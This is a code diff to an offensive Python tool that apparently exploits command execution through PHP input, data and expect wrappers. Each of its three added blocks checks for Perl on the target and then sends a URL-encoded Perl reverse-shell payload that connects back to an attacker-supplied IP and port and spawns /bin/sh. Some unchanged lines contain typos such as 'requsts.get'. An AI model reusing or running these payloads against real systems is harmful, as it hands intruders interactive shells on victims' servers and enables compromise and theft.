@@ -416,6 +416,18 @@ def exploit(exploits, method):
             if(exploit['OS'] == 'LINUX'):
                 url = exploit['GETVAL']
                 
+                #Perl
+                u = url.replace('TMP', 'which%20perl')
+                res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                if('/bin' in res.text and '/perl' in res.text):
+                    perlPayload = "perl+-e+'use+Socket%3b$i%3d\"" + ip + "\"%3b$p%3d"+str(port)+"%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\")%3bopen(STDOUT,\">%26S\")%3bopen(STDERR,\">%26S\")%3bexec(\"/bin/sh+-i\")%3b}%3b'"
+                    
+                    u = url.replace('TMP', perlPayload)
+                    print(perlPayload)
+                    printInfo(ip, port, 'perl', 'input wrapper')
+                    requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                    return
+                
                 #Bash
                 u = url.replace('TMP', 'which%20bash')
                 res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
@@ -448,6 +460,7 @@ def exploit(exploits, method):
                     return
             
 
+            
             #WINDOWS
             elif(exploit['OS'] == 'WINDOWS'):
                 url = exploit['GETVAL']
@@ -464,6 +477,16 @@ def exploit(exploits, method):
             if(exploit['OS'] == 'LINUX'):
                 url = exploit['GETVAL']
                
+                #Perl
+                u = url.replace('TMP', 'which%20perl')
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if('/bin' in res.text and '/perl' in res.text):
+                    printInfo(ip, port, 'perl', 'data wrapper')
+                    perlPayload = "perl+-e+'use+Socket%3b$i%3d\"" + ip + "\"%3b$p%3d"+str(port)+"%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\")%3bopen(STDOUT,\">%26S\")%3bopen(STDERR,\">%26S\")%3bexec(\"/bin/sh+-i\")%3b}%3b'"
+
+                    requests.get(url.replace('TMP', perlPayload), headers = headers, proxies = proxies)
+                    return
+
                 #Bash
                 u = url.replace('TMP', 'which%20bash')
                 res = requests.get(u, headers = headers, proxies = proxies)
@@ -510,7 +533,16 @@ def exploit(exploits, method):
             #Linux
             if(exploit['OS' == 'LINUX']):
                 url = exploit['GETVAL']
-                
+               
+                #Perl
+                u = url.replace('TMP', 'which%20perl')
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if('/bin' in res.text and '/perl' in res.text):
+                    perlPayload = "perl+-e+'use+Socket%3b$i%3d\"" + ip + "\"%3b$p%3d"+str(port)+"%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\")%3bopen(STDOUT,\">%26S\")%3bopen(STDERR,\">%26S\")%3bexec(\"/bin/sh+-i\")%3b}%3b'"
+                    printInfo(ip, port, 'perl', 'expect wrapper')
+                    requests.get(url.replace('TMP', perlPayload), headers = headers, proxies = proxies)
+                    return
+
                 #Bash
                 u = url.replace('TMP', 'which%20bash')
                 res = requsts.get(u, headers = headers, proxies = proxies)
